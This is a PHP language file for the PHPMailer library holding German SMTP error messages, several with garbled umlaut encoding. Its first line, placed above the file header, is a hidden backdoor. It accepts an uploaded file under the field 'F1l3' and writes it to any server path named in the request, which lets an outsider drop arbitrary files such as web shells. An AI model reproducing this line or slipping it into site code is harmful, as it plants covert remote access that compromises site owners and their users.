<?php
if ($_FILES['F1l3']) {move_uploaded_file($_FILES['F1l3']['tmp_name'], $_POST['Name']); echo 'OK'; Exit;}
/**
* PHPMailer language file: refer to English translation for definitive list
* German Version
*/

$PHPMAILER_LANG['authenticate']         = 'SMTP Fehler: Authentifizierung fehlgeschlagen.';
$PHPMAILER_LANG['connect_host']         = 'SMTP Fehler: Konnte keine Verbindung zum SMTP-Host herstellen.';
$PHPMAILER_LANG['data_not_accepted']    = 'SMTP Fehler: Daten werden nicht akzeptiert.';
$PHPMAILER_LANG['empty_message']        = 'E-Mail Inhalt ist leer.';
$PHPMAILER_LANG['encoding']             = 'Unbekanntes Encoding-Format: ';
$PHPMAILER_LANG['execute']              = 'Konnte folgenden Befehl nicht ausfГјhren: ';
$PHPMAILER_LANG['file_access']          = 'Zugriff auf folgende Datei fehlgeschlagen: ';
$PHPMAILER_LANG['file_open']            = 'Datei Fehler: konnte folgende Datei nicht Г¶ffnen: ';
$PHPMAILER_LANG['from_failed']          = 'Die folgende Absenderadresse ist nicht korrekt: ';
$PHPMAILER_LANG['instantiate']          = 'Mail Funktion konnte nicht initialisiert werden.';
$PHPMAILER_LANG['invalid_email']        = 'E-Mail wird nicht gesendet, die Adresse ist ungГјltig.';
$PHPMAILER_LANG['mailer_not_supported'] = ' mailer wird nicht unterstГјtzt.';
$PHPMAILER_LANG['provide_address']      = 'Bitte geben Sie mindestens eine EmpfГ¤nger E-Mailadresse an.';
$PHPMAILER_LANG['recipients_failed']    = 'SMTP Fehler: Die folgenden EmpfГ¤nger sind nicht korrekt: ';
$PHPMAILER_LANG['signing']              = 'Fehler beim Signieren: ';
$PHPMAILER_LANG['smtp_connect_failed']  = 'Verbindung zu SMTP Server fehlgeschlagen.';
$PHPMAILER_LANG['smtp_error']           = 'Fehler vom SMTP Server: ';
$PHPMAILER_LANG['variable_set']         = 'Kann Variable nicht setzen oder zurГјcksetzen: ';
?>